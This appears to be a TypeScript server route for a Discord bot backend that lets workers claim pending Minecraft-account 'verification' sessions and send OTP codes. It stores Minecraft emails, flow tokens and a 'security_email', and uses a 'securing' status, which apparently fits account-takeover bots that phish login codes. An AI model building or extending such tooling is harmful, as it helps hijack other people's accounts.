import { createFileRoute } from "@tanstack/react-router";
import { authWorker, workerDb } from "@/lib/worker-auth.server";

const db = workerDb;

export const Route = createFileRoute("/api/bots/worker/otp-pending")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        if (!authWorker(request)) return Response.json({ error: "Unauthorized" }, { status: 401 });

        let body: { worker_id?: string; limit?: number };
        try {
          body = await request.json();
        } catch {
          return Response.json({ error: "Invalid JSON" }, { status: 400 });
        }
        if (!body.worker_id) return Response.json({ error: "worker_id required" }, { status: 400 });

        const client = db();
        const limit = Math.min(Math.max(body.limit || 3, 1), 10);

        // Reclaim stuck OTP claims (worker died mid-send)
        const stuckBefore = new Date(Date.now() - 3 * 60_000).toISOString();
        await client
          .from("verification_sessions")
          .update({
            status: "failed",
            error_message: "OTP send timed out (stuck securing) — try again",
          })
          .eq("status", "securing")
          .eq("error_message", "otp_sending")
          .lt("created_at", stuckBefore);

        // Claim oldest pending OTP-send sessions (HTTP path only; gateway uses securing+gateway_otp)
        const { data: pending, error: listErr } = await client
          .from("verification_sessions")
          .select(
            "id, discord_id, guild_id, mc_username, mc_email, flow_token, security_email, channel_id, created_at",
          )
          .eq("status", "pending")
          .order("created_at", { ascending: true })
          .limit(limit);

        if (listErr) {
          console.error("[otp-pending] list failed:", listErr.message);
          return Response.json({ error: listErr.message }, { status: 500 });
        }
        if (!pending?.length) return Response.json({ sessions: [] });

        const claimed: typeof pending = [];
        for (const row of pending) {
          // CAS: only one worker takes it — mark securing while sending OTP
          const { data: updated, error } = await client
            .from("verification_sessions")
            .update({
              status: "securing",
              error_message: "otp_sending",
              otp_method: body.worker_id,
            })
            .eq("id", row.id)
            .eq("status", "pending")
            .select(
              "id, discord_id, guild_id, mc_username, mc_email, flow_token, security_email, channel_id, created_at",
            )
            .maybeSingle();
          if (!error && updated) claimed.push(updated);
        }

        return Response.json({ sessions: claimed });
      },
    },
  },
});
